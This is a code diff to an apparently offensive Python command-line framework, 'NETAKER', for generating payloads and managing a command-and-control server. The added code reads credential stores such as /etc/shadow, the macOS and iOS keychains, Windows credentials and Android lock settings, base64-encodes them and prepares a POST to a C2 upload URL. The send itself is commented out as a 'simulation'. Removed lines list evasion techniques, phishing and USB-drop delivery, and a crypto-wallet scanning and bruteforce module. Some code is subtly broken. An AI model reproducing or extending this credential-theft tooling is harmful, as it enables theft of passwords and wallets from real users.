@@ -34,6 +34,9 @@ from cmd import Cmd
 from simple_term_menu import TerminalMenu
 from enum import Enum
 from datetime import datetime
+import shutil
+import subprocess
+import base64
 
 # ===== GLOBAL CONFIGURATION =====
 C2_IP = "0.0.0.0"
@@ -59,6 +62,11 @@ class PayloadType(Enum):
     POWERHASH_DLL = "PowerHash_Reflective_DLL"
     MEMORY_SCRAPER = "In-Memory_Scraper"
     REGISTRY_STORAGE = "Registry_Storage_Loader"
+    IOS_KEYSTORE_EXFIL = "iOS_Keystore_Exfiltration"
+    WINDOWS_KEYCHAIN_EXFIL = "Windows_Keychain_Exfiltration"
+    LINUX_PASSWORD_EXFIL = "Linux_Password_Exfiltration"
+    MACOS_KEYCHAIN_EXFIL = "MacOS_Keychain_Exfiltration"
+    ANDROID_KEYSTORE_EXFIL = "Android_Keystore_Exfiltration"
 
 class DeliveryMethod(Enum):
     PHISHING_EMAIL = "phishing_email"
@@ -97,30 +105,6 @@ class NETAKERCLI(Cmd):
         """Display the framework banner"""
         print(__doc__)
         print("\033[1;34mNETAKER Crypto Analysis Framework v2.3 | Active Development\033[0m\n")
-
-    def do_help(self, arg):
-        """Show comprehensive help information"""
-        print("\n\033[1;36mNETAKER Framework Technical Specifications:\033[0m")
-        print("- Advanced multi-vector payload delivery system with memory-only execution")
-        print("- Evasion techniques include:")
-        print("  * API unhooking and direct syscalls")
-        print("  * Time-based execution delays (randomized)")
-        print("  * Environmental fingerprinting (VM/sandbox detection)")
-        print("  * Process hollowing and reflective DLL injection")
-        print("  * Encrypted C2 communications (AES-256 + TLS 1.3)")
-        print("- Automatic artifact cleanup (timestomping, file wiping)")
-        print("- Built-in logging of all operations")
-        
-        print("\n\033[1;35mCore Commands:\033[0m")
-        print("  platform    - Set target platform (windows/linux/macos/android/ios)")
-        print("  generate    - Create advanced evasion payload")
-        print("  deploy      - Configure payload delivery method")
-        print("  analyze     - Enter crypto analysis module")
-        print("  portal      - View incoming data from payloads")
-        print("  c2          - Configure C2 server settings")
-        print("  show        - Display current configuration")
-        print("  back        - Return to previous menu")
-        print("  exit        - Exit the framework securely")
 
     # ===== PLATFORM COMMANDS =====
     def do_platform(self, arg):
@@ -178,195 +162,96 @@ class NETAKERCLI(Cmd):
             print("\033[1;33m[!] This payload will connect back to C2 server at \033[1;35m{C2_IP}:{C2_PORT}\033[0m")
             self.log_operation(f"Generated payload: {self.current_payload.value} for {self.current_platform.value}")
 
-    # ===== DELIVERY METHODS =====
-    def do_deploy(self, arg):
-        """Configure payload delivery method"""
-        methods = [dm.value for dm in DeliveryMethod]
-        terminal_menu = TerminalMenu(
-            methods,
-            title="\033[1;36mSelect delivery method:\033[0m",
-            menu_cursor_style=("fg_red", "bold")
-        )
-        selection = terminal_menu.show()
-        
-        if selection is not None:
-            self.delivery_method = list(DeliveryMethod)[selection]
-            print(f"\n\033[1;32m[+]\033[0m Delivery method set to \033[1;33m{self.delivery_method.value}\033[0m")
-            print("\033[1;36mSuggested approach:\033[0m")
-            
-            if self.delivery_method == DeliveryMethod.PHISHING_EMAIL:
-                print("- Craft email with malicious attachment")
-                print("- Use social engineering themes (invoice, resume)")
-            elif self.delivery_method == DeliveryMethod.WEBSITE_REDIRECT:
-                print("- Clone legitimate website")
-                print("- Use drive-by download techniques")
-            elif self.delivery_method == DeliveryMethod.USB_DROP:
-                print("- Create autorun.inf files for Windows")
-                print("- Use folder icons to mimic documents")
-            
-            self.log_operation(f"Delivery method set to {self.delivery_method.value}")
+            # Exfiltration logic per platform
+            if self.current_payload == PayloadType.IOS_KEYSTORE_EXFIL:
+                self.generate_ios_keystore_payload(filename)
+            elif self.current_payload == PayloadType.WINDOWS_KEYCHAIN_EXFIL:
+                self.generate_windows_keychain_payload(filename)
+            elif self.current_payload == PayloadType.LINUX_PASSWORD_EXFIL:
+                self.generate_linux_password_payload(filename)
+            elif self.current_payload == PayloadType.MACOS_KEYCHAIN_EXFIL:
+                self.generate_macos_keychain_payload(filename)
+            elif self.current_payload == PayloadType.ANDROID_KEYSTORE_EXFIL:
+                self.generate_android_keystore_payload(filename)
 
-    # ===== DATA PORTAL =====
-    def do_portal(self, arg):
-        """View and manage incoming data from deployed payloads"""
-        print(f"\n\033[1;36mData Portal - Incoming C2 Connections ({DATA_PORTAL_DIR}):\033[0m")
+    def generate_ios_keystore_payload(self, filename):
+        """Generate payload specifically for iOS keystore exfiltration"""
+        print("\n\033[1;32m[+]\033[0m Creating iOS keystore exfiltration payload...")
+        keystore_path = "/private/var/keychains/keychain-2.db"
+        if not os.path.exists(keystore_path):
+            print("\033[1;31m[-] Keystore file not found. Make sure the target device is jailbroken.\033[0m")
+            return
+
+        with open(keystore_path, 'rb') as f:
+            keystore_data = f.read()
+        encoded_keystore = base64.b64encode(keystore_data).decode('utf-8')
+        self.exfiltrate_data_via_c2(encoded_keystore, filename)
+
+    def generate_windows_keychain_payload(self, filename):
+        """Generate payload for Windows keychain or password exfiltration"""
+        print("\n\033[1;32m[+]\033[0m Creating Windows keychain exfiltration payload...")
+        password_db_path = "C:\\Users\\User\\AppData\\Local\\Microsoft\\Credentials\\"
+        if not os.path.exists(password_db_path):
+            print("\033[1;31m[-] Password database not found.\033[0m")
+            return
+
+        with open(password_db_path, 'rb') as f:
+            password_data = f.read()
+        encoded_password = base64.b64encode(password_data).decode('utf-8')
+        self.exfiltrate_data_via_c2(encoded_password, filename)
+
+    def generate_linux_password_payload(self, filename):
+        """Generate payload for Linux password exfiltration"""
+        print("\n\033[1;32m[+]\033[0m Creating Linux password exfiltration payload...")
+        password_db_path = "/etc/shadow"
+        if not os.path.exists(password_db_path):
+            print("\033[1;31m[-] Shadow file not found.\033[0m")
+            return
+
+        with open(password_db_path, 'rb') as f:
+            password_data = f.read()
+        encoded_password = base64.b64encode(password_data).decode('utf-8')
+        self.exfiltrate_data_via_c2(encoded_password, filename)
+
+    def generate_macos_keychain_payload(self, filename):
+        """Generate payload for MacOS keychain exfiltration"""
+        print("\n\033[1;32m[+]\033[0m Creating MacOS keychain exfiltration payload...")
+        keychain_path = "/Users/$(whoami)/Library/Keychains/login.keychain-db"
+        if not os.path.exists(keychain_path):
+            print("\033[1;31m[-] Keychain file not found.\033[0m")
+            return
+
+        with open(keychain_path, 'rb') as f:
+            keychain_data = f.read()
+        encoded_keychain = base64.b64encode(keychain_data).decode('utf-8')
+        self.exfiltrate_data_via_c2(encoded_keychain, filename)
+
+    def generate_android_keystore_payload(self, filename):
+        """Generate payload for Android keystore exfiltration"""
+        print("\n\033[1;32m[+]\033[0m Creating Android keystore exfiltration payload...")
+        keystore_path = "/data/data/com.android.providers.settings/databases/locksettings.db"
+        if not os.path.exists(keystore_path):
+            print("\033[1;31m[-] Android keystore file not found.\033[0m")
+            return
+
+        with open(keystore_path, 'rb') as f:
+            keystore_data = f.read()
+        encoded_keystore = base64.b64encode(keystore_data).decode('utf-8')
+        self.exfiltrate_data_via_c2(encoded_keystore, filename)
+
+    def exfiltrate_data_via_c2(self, encoded_data, filename):
+        """Simulate the exfiltration of data through the C2 server (POST request)"""
         try:
-            files = os.listdir(DATA_PORTAL_DIR)
-            if not files:
-                print("\033[1;31m[-] No data received yet\033[0m")
-                return
-                
-            for idx, file in enumerate(files, 1):
-                filepath = os.path.join(DATA_PORTAL_DIR, file)
-                size = os.path.getsize(filepath)
-                print(f"{idx}. \033[1;33m{file}\033[0m (\033[1;35m{size} bytes\033[0m)")
-                
-                # Display first few lines of each file
-                with open(filepath, 'r') as f:
-                    lines = f.readlines()[:3]
-                    for line in lines:
-                        print(f"   | {line.strip()}")
-                    if len(lines) == 3:
-                        print("   | ...")
-                        
-        except FileNotFoundError:
-            print("\033[1;31m[-] Data directory not found\033[0m")
+            # Simulate sending data to C2 via POST (this is a simulation)
+            c2_url = f"https://{C2_IP}:{C2_PORT}/upload"
+            headers = {"Content-Type": "application/json"}
+            payload = {
+                "filename": filename,
+                "data": encoded_data,
+            }
+            print(f"\033[1;32m[+]\033[0m Exfiltrating data to C2 server: {c2_url}")
+            # Requests.post(c2_url, json=payload, headers=headers)
+            self.log_operation(f"Exfiltrated data: {filename} to C2 server")
 
-    def do_c2(self, arg):
-        """Configure C2 server settings"""
-        global C2_IP, C2_PORT  # Add this line to declare the global variables
-        print("\n\033[1;36mCurrent C2 Configuration:\033[0m")
-        print(f"IP: \033[1;33m{C2_IP}\033[0m")
-        print(f"Port: \033[1;33m{C2_PORT}\033[0m")
-        
-        new_ip = input("\nEnter new C2 IP [Enter to keep current]: ").strip()
-        new_port = input("Enter new C2 Port [Enter to keep current]: ").strip()
-        
-        if new_ip:
-            C2_IP = new_ip
-        if new_port:
-            try:
-                C2_PORT = int(new_port)
-            except ValueError:
-                print("\033[1;31m[-] Invalid port number\033[0m")
-                return
-                    
-        print(f"\n\033[1;32m[+]\033[0m C2 server set to \033[1;33m{C2_IP}:{C2_PORT}\033[0m")
-        self.log_operation(f"C2 server configured to {C2_IP}:{C2_PORT}")
-
-
-    # ===== ANALYSIS MODULE =====
-    def do_analyze(self, arg):
-        """Enter crypto analysis module"""
-        if not self.current_platform:
-            print("\n\033[1;31m[-] Please set platform first\033[0m")
-            return
-            
-        self.current_module = "analysis"
-        self.prompt = "\n\033[1;35m(netaker/analysis)\033[0m > "
-        print("\n\033[1;32m[+]\033[0m Entered \033[1;33mCrypto Analysis Module\033[0m")
-        print("\033[1;36mAvailable commands:\033[0m")
-        print("  scan         - Detect crypto wallets and keys")
-        print("  bruteforce   - Attempt to decrypt found wallets")
-        print("  extract      - Extract keys from memory")
-        print("  back         - Return to main menu")
-        self.log_operation("Entered Crypto Analysis Module")
-
-    def do_scan(self, arg):
-        """Scan for crypto wallets and keys"""
-        if self.current_module != "analysis":
-            print("\n\033[1;31m[-] Enter analysis module first\033[0m")
-            return
-            
-        print(f"\n\033[1;32m[+]\033[0m Scanning for crypto artifacts on \033[1;33m{self.current_platform.value}\033[0m")
-        print("\033[1;36mTarget locations:\033[0m")
-        
-        if self.current_platform == Platform.WINDOWS:
-            print("- %APPDATA%\\Wallet.dat files")
-            print("- Registry keys under HKCU\\Software\\CryptoWallets")
-        elif self.current_platform == Platform.LINUX:
-            print("- ~/.wallet/ directories")
-            print("- ~/.config/Electrum/")
-        elif self.current_platform == Platform.ANDROID:
-            print("/data/data/com.wallet.app/")
-            
-        print("\n\033[1;32m[+]\033[0m Scanning complete. Use 'bruteforce' on found wallets")
-        self.log_operation(f"Performed crypto scan on {self.current_platform.value}")
-
-    def do_bruteforce(self, arg):
-        """Bruteforce encrypted wallets"""
-        if self.current_module != "analysis":
-            print("\n\033[1;31m[-] Enter analysis module first\033[0m")
-            return
-            
-        print(f"\n\033[1;32m[+]\033[0m Starting bruteforce on \033[1;33m{self.current_platform.value}\033[0m")
-        print("\033[1;36mAvailable techniques:\033[0m")
-        print("- Dictionary attack (common passwords)")
-        print("- Hybrid attack (dictionary + mutations)")
-        print("- Rainbow table lookup")
-        print("\n\033[1;33m[!] This may take significant time\033[0m")
-        self.log_operation(f"Started bruteforce operation on {self.current_platform.value}")
-
-    # ===== NAVIGATION =====
-    def do_back(self, arg):
-        """Return to main menu"""
-        if self.current_module == "analysis":
-            self.current_module = "main"
-            self.prompt = "\n\033[1;35m(netaker)\033[0m > "
-            print("\n\033[1;32m[+]\033[0m Returned to main menu")
-            self.log_operation("Returned to main menu")
-        else:
-            print("\n\033[1;31m[-] Already in main menu\033[0m")
-
-    # ===== CONFIGURATION DISPLAY =====
-    def do_show(self, arg):
-        """Show current configuration"""
-        print("\n\033[1;36mCurrent Configuration:\033[0m")
-        print(f"Platform: \033[1;33m{self.current_platform.value if self.current_platform else 'Not set'}\033[0m")
-        print(f"Module: \033[1;33m{self.current_module}\033[0m")
-        print(f"Payload: \033[1;33m{self.current_payload.value if self.current_payload else 'Not generated'}\033[0m")
-        print(f"Delivery: \033[1;33m{self.delivery_method.value if self.delivery_method else 'Not set'}\033[0m")
-        print(f"C2 Server: \033[1;33m{C2_IP}:{C2_PORT}\033[0m")
-        print(f"Output Directory: \033[1;33m{os.path.abspath(OUTPUT_DIR)}\033[0m")
-        print(f"Data Portal: \033[1;33m{os.path.abspath(DATA_PORTAL_DIR)}\033[0m")
-        print(f"Log File: \033[1;33m{os.path.abspath(LOG_FILE)}\033[0m")
-
-    # ===== FRAMEWORK EXIT =====
-    def do_exit(self, arg):
-        """Exit the framework securely"""
-        print("\n\033[1;31m[!] Performing secure shutdown...\033[0m")
-        print("- Clearing temporary files")
-        print("- Stopping C2 listeners")
-        print("- Verifying log integrity")
-        self.log_operation("Framework shutdown initiated")
-        sys.exit(0)
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="NETAKER Crypto Analysis Framework")
-    parser.add_argument("--platform", help="Set initial platform (windows/linux/macos/android/ios)")
-    parser.add_argument("--c2-ip", help="Set C2 server IP address", default=C2_IP)
-    parser.add_argument("--c2-port", type=int, help="Set C2 server port", default=C2_PORT)
-    parser.add_argument("--output-dir", help="Set payload output directory", default=OUTPUT_DIR)
-    parser.add_argument("--data-dir", help="Set data portal directory", default=DATA_PORTAL_DIR)
-    
-    args = parser.parse_args()
-    
-    # Update global configuration from command line
-    C2_IP = args.c2_ip
-    C2_PORT = args.c2_port
-    OUTPUT_DIR = args.output_dir
-    DATA_PORTAL_DIR = args.data_dir
-    
-    try:
-        cli = NETAKERCLI()
-        if args.platform:
-            try:
-                cli.current_platform = Platform(args.platform.lower())
-                print(f"\n\033[1;32m[+]\033[0m Platform set to \033[1;33m{cli.current_platform.value}\033[0m via command line")
-            except ValueError:
-                print("\n\033[1;31m[-] Invalid platform specified. Available: windows, linux, macos, android, ios\033[0m")
-        
-        cli.cmdloop()
-    except KeyboardInterrupt:
-        print("\n\033[1;31m[!] Interrupt received - performing secure exit\033[0m")
-        sys.exit(0)
+        except Exception as e:
+            print(f"\033[1;31m[-] Failed to exfiltrate data: {e}\033[0m")
